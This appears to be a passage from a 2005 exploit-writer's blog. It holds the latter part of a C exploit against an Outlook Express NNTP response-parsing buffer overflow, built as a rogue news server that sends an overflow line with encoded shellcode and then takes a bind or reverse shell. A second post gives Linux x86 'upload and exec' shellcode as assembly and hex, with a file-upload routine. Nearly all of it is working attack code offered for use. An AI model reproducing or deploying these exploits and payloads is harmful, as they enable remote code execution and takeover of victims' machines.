"\x99\x99\x99\x12\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3"
"\x9D\xC0\x71\x02\x99\x99\x99\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE"
"\xEA\xAB\xC6\xCD\x66\x8F\x12\x71\xF3\x9D\xC0\x71\x1B\x99\x99\x99"
"\x7B\x60\x18\x75\x09\x98\x99\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF"
"\x89\xC9\xC9\xC9\xC9\xD9\xC9\xD9\xC9\x66\xCF\x8D\x12\x41\xF1\xE6"
"\x99\x99\x98\xF1\x9B\x99\x9D\x4B\x12\x55\xF3\x89\xC8\xCA\x66\xCF"
"\x81\x1C\x59\xEC\xD3\xF1\xFA\xF4\xFD\x99\x10\xFF\xA9\x1A\x75\xCD"
"\x14\xA5\xBD\xF3\x8C\xC0\x32\x7B\x64\x5F\xDD\xBD\x89\xDD\x67\xDD"
"\xBD\xA4\x10\xC5\xBD\xD1\x10\xC5\xBD\xD5\x10\xC5\xBD\xC9\x14\xDD"
"\xBD\x89\xCD\xC9\xC8\xC8\xC8\xF3\x98\xC8\xC8\x66\xEF\xA9\xC8\x66"
"\xCF\x9D\x12\x55\xF3\x66\x66\xA8\x66\xCF\x91\xCA\x66\xCF\x85\x66"
"\xCF\x95\xC8\xCF\x12\xDC\xA5\x12\xCD\xB1\xE1\x9A\x4C\xCB\x12\xEB"
"\xB9\x9A\x6C\xAA\x50\xD0\xD8\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3"
"\x4F\xED\x91\x58\x52\x94\x9A\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC3"
"\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D"
"\x12\x9A\x5C\x32\xC7\xC0\x5A\x71\x99\x66\x66\x66\x17\xD7\x97\x75"
"\xEB\x67\x2A\x8F\x34\x40\x9C\x57\x76\x57\x79\xF9\x52\x74\x65\xA2"
"\x40\x90\x6C\x34\x75\x60\x33\xF9\x7E\xE0\x5F\xE0";
*/

unsigned char shakehand1[] =
"\x32\x30\x30\x20\x52\x65\x61\x64\x79\x20\x2d\x20\x70\x6f\x73\x74"
"\x69\x6e\x67\x20\x61\x6c\x6c\x6f\x77\x65\x64\x2e\x0d\x0a";

unsigned char shakehand2[] =
"\x32\x31\x35\x20\x4c\x69\x73\x74\x20\x6f\x66\x20\x6e\x65\x77\x73"
"\x67\x72\x6f\x75\x70\x73\x20\x66\x6f\x6c\x6c\x6f\x77\x73\x2e\x0d"
"\x0a";

/*
unsigned char jumper[] =
"\xe9\x00\x00\xff\xff"; //jmp -xxxx
*/

int
isip ( char *ip )
{
	int a, b, c, d;

	if ( !sscanf ( ip, "%d.%d.%d.%d", &a, &b, &c, &d ) )
		return ( 0 );
	if ( a < 1 )
		return ( 0 );
	if ( a > 255 )
		return 0;
	if ( b < 0 )
		return 0;
	if ( b > 255 )
		return 0;
	if ( c < 0 )
		return 0;
	if ( c > 255 )
		return 0;
	if ( d < 0 )
		return 0;
	if ( d > 255 )
		return 0;
	return 1;
}

int
shell ( int s, char* tip, unsigned short cbport )
{
	int n;
	char buffer[2048];
	fd_set fd_read;

	printf ( "--[" YELLOW " b" NORMAL "0" YELLOW "x " NORMAL "p" YELLOW "w" NORMAL "n" YELLOW "e" NORMAL "d " YELLOW "- " NORMAL "h" YELLOW "4" NORMAL "v" YELLOW "e " NORMAL "p" YELLOW "h" NORMAL "u" YELLOW "n" NORMAL "\n" );

	FD_ZERO ( &fd_read );
	FD_SET ( s, &fd_read );
	FD_SET ( 0, &fd_read );

	while ( 1 )
	{
		FD_SET ( s, &fd_read );
		FD_SET ( 0, &fd_read );

		if ( select ( s + 1, &fd_read, NULL, NULL, NULL ) < 0 )
			break;
		if ( FD_ISSET ( s, &fd_read ) )
		{
			if ( ( n = recv ( s, buffer, sizeof ( buffer ), 0 ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( write ( 1, buffer, n ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		if ( FD_ISSET ( 0, &fd_read ) )
		{
			if ( ( n = read ( 0, buffer, sizeof ( buffer ) ) ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
			if ( send ( s, buffer, n, 0 ) < 0 )
			{
				printf ( "bye bye...\n" );
				return;
			}
		}
		usleep(10);
	}
}

void
connect_to_bindshell ( char* tip, unsigned short bport )
{
	int s;
	int sec = 5; // change this for fast targets
	struct sockaddr_in remote_addr;
	struct hostent *host_addr;

	if ( ( host_addr = gethostbyname ( tip ) ) == NULL )
	{
		fprintf ( stderr, "cannot resolve \"%s\"\n", tip );
		exit ( 1 );
	}

	remote_addr.sin_family = AF_INET;
	remote_addr.sin_addr   = * ( ( struct in_addr * ) host_addr->h_addr );
	remote_addr.sin_port   = htons ( bport );

	if ( ( s = socket ( AF_INET, SOCK_STREAM, 0 ) ) < 0 )
        {
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	printf ( "--[ sleeping %d seconds before connecting to %s:%u...\n", sec, tip, bport );
	wait ( sec );
	printf ( "--[ connecting to %s:%u...", tip, bport );
	if ( connect ( s, ( struct sockaddr * ) &remote_addr, sizeof ( struct sockaddr ) ) ==  -1 )
	{
		printf ( RED "failed!\n" NORMAL);
		exit ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	shell ( s, tip, bport );
}

void
exploit ( int s, int option )
{
	char in[1024];
	char out[32000];
	char a[23600];

	//msoeres.dll - 5.50.4807.1700 - Englisch (USA)

	unsigned long callebx1 = 0x60209371;

	printf ( "--[ shaking hands #1..." );
	if ( send ( s, shakehand1, sizeof ( shakehand1 ) -1, 0 ) < 0 )
	{
		printf ( "failed\n" );
		exit ( 1 );
	}
	printf ( "done\n" );
	bzero ( &in, sizeof ( in ) );
	printf ( "--[ reply: " );
	if ( recv ( s, in, sizeof ( in ) -1, 0 ) < 0 )
	{
		printf ( "failed\n" );
		exit ( 1 );
	}
	printf ( "%s", in );
	printf ( "--[ shaking hands #2..." );
	if ( send ( s, shakehand1, sizeof ( shakehand1 ) -1, 0 ) < 0 )
	{
		printf ( "failed\n" );
		exit ( 1 );
	}
	printf ( "done\n" );
	bzero ( &in, sizeof ( in ) );
	printf ( "--[ reply: " );
	if ( recv ( s, in, sizeof ( in ) -1, 0 ) < 0 )
	{
		printf ( "failed\n" );
		exit ( 1 );
	}
	printf ( "%s", in );
	printf ( "--[ shaking hands #3..." );
	if ( send ( s, shakehand2, sizeof ( shakehand2 ) -1, 0 ) < 0 )
	{
		printf ( "failed\n" );
		exit ( 1 );
	}
	printf ( "done\n" );

	bzero ( &a, sizeof ( a ) );
	memset ( a, 0x90, sizeof ( a ) );
	memcpy ( a + 9623, "\xeb\x08", 2 );
	memcpy ( a + 9627, ( unsigned char* ) &callebx1, 4 );

/*
	if ( option == 0 )
		memcpy ( a + 9647, reverseshell, sizeof ( reverseshell ) -1 );
	else
		memcpy ( a + 9647, bindshell, sizeof ( bindshell ) -1 );
*/
	memcpy ( a + 9640, scode, sizeof ( scode ) -1 );

	bzero ( &out, sizeof ( out ) );
	snprintf ( out, sizeof ( out ) -1, "alt.12hr 0%s000001325 0000001322 y\r\n", a );
	printf ( "--[ sending bad newsgroup..." );
	if ( send ( s, out, strlen ( out ), 0 ) < 0 )
	{
		printf ( "failed\n" );
		exit ( 1 );
	}
	printf ( "done\n" );

	close ( s );
}

/*
void
header ()
{
	printf ( "              __              __                   _           \n" );
	printf ( "  _______  __/ /_  ___  _____/ /__________  ____  (_)____      \n" );
	printf ( " / ___/ / / / __ \\/ _ \\/ ___/ __/ ___/ __ \\/ __ \\/ / ___/  \n" );
	printf ( "/ /__/ /_/ / /_/ /  __/ /  / /_/ /  / /_/ / / / / / /__        \n" );
	printf ( "\\___/\\__, /_.___/\\___/_/   \\__/_/   \\____/_/ /_/_/\\___/  \n" );
	printf ( "    /____/                                                     \n\n" );
	printf ( "--[ exploit by : cybertronic - cybertronic[at]gmx[dot]net\n" );
}
*/

void
start_reverse_handler ( unsigned short cbport )
{
	int s1, s2;
	struct sockaddr_in cliaddr, servaddr;
	socklen_t clilen = sizeof ( cliaddr );

	bzero ( &servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( cbport );

	printf ( "--[ starting reverse handler [port: %u]...", cbport );
	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
	{
		printf ( "socket failed!\n" );
		exit ( 1 );
	}
	bind ( s1, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
	if ( listen ( s1, 1 ) == -1 )
	{
		printf ( "listen failed!\n" );
		exit ( 1 );
	}
	printf ( YELLOW "done!\n" NORMAL);
	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
	{
		printf ( "accept failed!\n" );
		exit ( 1 );
	}
	close ( s1 );
	printf ( "--[ incomming connection from:\t" YELLOW " %s\n" NORMAL, inet_ntoa ( cliaddr.sin_addr ) );
	shell ( s2, ( char* ) inet_ntoa ( cliaddr.sin_addr ), cbport );
	close ( s2 );
}

void
wait ( int sec )
{
	sleep ( sec );
}

int
main ( int argc, char* argv[] )
{
	int s1, s2;
	unsigned long lip;
	unsigned long xoredip;
	unsigned short cbport, xoredcbport;
	char* ip;
	pid_t childpid;
	socklen_t clilen;
	struct sockaddr_in cliaddr, servaddr;

	if ( argc != 1 )
		if ( argc != 3 )
		{
			fprintf ( stderr, "Usage\n\nBindshell: %s\nReverseshell: %s  \n", argv[0] );
			exit ( 1 );
		}

	//system ( "clear" );
	//header ();

	if ( argc == 3 )
	{
		if ( !isip ( argv[1] ) )
		{
			printf ( "--[ Invalid connectback IP!\n" );
			exit ( 1 );
		}
	}

	if ( ( s1 = socket ( AF_INET, SOCK_STREAM, 0 ) ) == -1 )
		exit ( 1 );

	bzero ( &servaddr, sizeof ( servaddr ) );
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl ( INADDR_ANY );
	servaddr.sin_port = htons ( PORT );

	bind ( s1, ( struct sockaddr * ) &servaddr, sizeof ( servaddr ) );
	printf ( "--[ Microsoft Outlook Express NNTP Response Parsing Buffer Overflow\n" );
	printf ( "--[ listening..." );

	if ( listen ( s1, 1 ) == -1 )
	{
		printf ( RED "FAILED!\n" NORMAL );
		exit ( 1 );
	}
	printf ( GREEN "OK!\n" NORMAL );

	clilen = sizeof ( cliaddr );

	if ( ( s2 = accept ( s1, ( struct sockaddr * ) &cliaddr, &clilen ) ) < 0 )
			exit ( 1 );

	close ( s1 );

	printf ( "--[" GREEN " Incomming connection from:\t %s\n" NORMAL, inet_ntoa ( cliaddr.sin_addr ) );

	if ( argc == 3 )
	{
		printf ( "--[" YELLOW " using connect back shellcode!\n" NORMAL );
		xoredip = inet_addr ( argv[1] ) ^ ( unsigned long  ) 0x99999999;
		xoredcbport = htons ( atoi ( argv[2] ) ) ^ ( unsigned short ) 0x9999;

		memcpy ( &reverseshell[111], &xoredip, 4);
		memcpy ( &reverseshell[118], &xoredcbport, 2);

		sscanf ( argv[2], "%u", &cbport );

		exploit ( s2, 0 );
		start_reverse_handler ( cbport );
	}
	else
	{
		printf ( "--[" YELLOW " using bind shellcode!\n" NORMAL );
		ip = ( char* ) inet_ntoa ( cliaddr.sin_addr );
		exploit ( s2, 1 );
		connect_to_bindshell ( ip, 4444 );
	}
}


(Comment on this)
Friday, June 17th, 2005
10:11 pm 	
UPLOAD & EXEC SHELLCODE

[1] converting asm to hex
[2] asm code
[3] hex output
[4] upload function

This is an 'upload and exec' shellcode for the x86 platform.
File has to be in executable format,
cool if you know the distribution of the target, otherwise
it is useless.

-cybertronic

[1]

/*
 * convert .s to shellcode typo/teso (typo@inferno.tusculum.edu)
 *
 * $ cat asm.s
 * .globl cbegin
 * .globl cend
 * cbegin:
 * "asm goes here"
 * cend:
 * $ gcc -Wall asm.s asm2hex.c -o out
 * $ ./out
 *
 */

#include

extern void cbegin();
extern void cend();

int
main ()
{
    int i = 0;
    int x = 0;
    char* buf = ( char* ) cbegin;

    printf ( "unsigned char shellcode[] =\n\"" );
    for ( ; ( *buf ) && ( buf < ( char* ) cend ); buf++ )
	{
		if ( i++ == 16 )
			i = 1;
		if ( i == 1 && x != 0 )
			printf ( "\"\n\"" );
		x = 1;
		printf ( "\\x%02x", ( unsigned char )* buf );
	}
	printf ( "\";\n" );
    return ( 0 );
}

[2]

# append to any bind shellcode
# gcc -Wall upload-exec.s asm2hex.c -o upload-exec
# cybertronic

.globl cbegin
.globl cend

cbegin:

	movl %eax,%ecx

	jmp getstr

start:

	popl %esi

	leal (%esi),%ebx
	xorl %eax,%eax
	movb %al,0x0b(%esi)

	pushl %esi
	pushl %ecx

	movb $0x05,%al
	movw $0x241,%cx
	movw $00777,%dx
	int  $0x80
	movl %eax,%edi
	popl %esi

read:

	movl %esi,%ebx
	movb $0x03,%al
	leal -200(%esp),%ecx
	movb $0x01,%dl
	int  $0x80

	cmpl $0xffffffff,%eax
	je end
	xorl %ecx,%ecx
	cmpl %eax,%ecx
	je continue

	leal -200(%esp),%ecx
	xorl %ebx,%ebx
	movl %edi,%ebx
	movl %eax,%edx
	movb $0x04,%al
	int  $0x80

	jmp read

continue:

	movb $0x06,%al
	movl %esi,%ebx
	int  $0x80
	movb $0x06,%al
	xorl %ebx,%ebx
	movl %edi,%ebx
	int  $0x80

	xorl %esi, %esi
	popl %esi
	movl %esi,0x0c(%esi)
	xorl %eax,%eax
	movl %eax,0x10(%esi)
	movb $0x0b,%al
	xchgl %esi,%ebx
	leal 0x0c(%ebx),%ecx
	leal 0x10(%ebx),%edx
	int $0x80

end:

	xorl %eax,%eax
	incl %eax
	int $0x80

getstr:

	call start
	.string "/usr/bin/ct"

cend:

[3]

/*
 * linux x86
 * 189 bytes upload & exec shellcode by cybertronic
 * cybertronic[at]gmx[dot]net
 *
 */

unsigned char shellcode[] =
"\x31\xdb\xf7\xe3\xb0\x66\x53\x43\x53\x43\x53\x89\xe1\x4b\xcd\x80"
"\x89\xc7\x52\x66\x68\xc7\xc7\x43\x66\x53\x89\xe1\xb0\xef\xf6\xd0"
"\x50\x51\x57\x89\xe1\xb0\x66\xcd\x80\xb0\x66\x43\x43\xcd\x80\x50"
"\x50\x57\x89\xe1\x43\xb0\x66\xcd\x80\x89\xc1\xeb\x70\x5e\x8d\x1e"
"\x31\xc0\x88\x46\x0b\x56\x51\xb0\x05\x66\xb9\x41\x02\x66\xba\xff"
"\x01\xcd\x80\x89\xc7\x5e\x89\xf3\xb0\x03\x8d\x8c\x24\x38\xff\xff"
"\xff\xb2\x01\xcd\x80\x83\xf8\xff\x74\x3e\x31\xc9\x39\xc1\x74\x13"
"\x8d\x8c\x24\x38\xff\xff\xff\x31\xdb\x89\xfb\x89\xc2\xb0\x04\xcd"
"\x80\xeb\xd3\xb0\x06\x89\xf3\xcd\x80\xb0\x06\x31\xdb\x89\xfb\xcd"
"\x80\x31\xf6\x5e\x89\x76\x0c\x31\xc0\x89\x46\x10\xb0\x0b\x87\xf3"
"\x8d\x4b\x0c\x8d\x53\x10\xcd\x80\x31\xc0\x40\xcd\x80\xe8\x8b\xff"
"\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x63\x74";

[4]
int
upload ( char* ip )
{
	int s;
	int fd;
	char ch;
	struct stat st;

	s = conn ( ip );

	if ( ( fd = open ( "file", O_RDONLY ) ) == -1 )
		return ( 1 );
	fstat ( fd, &st );
	while ( st.st_size-- > 0 )
	{
		if ( read ( fd, &ch, 1 ) < 0 )
			return ( 1 );
		if ( write ( s, &ch, 1 ) < 0 )
			return ( 1 );
	}
	close ( fd );
	close ( s );
	return ( 0 );
}
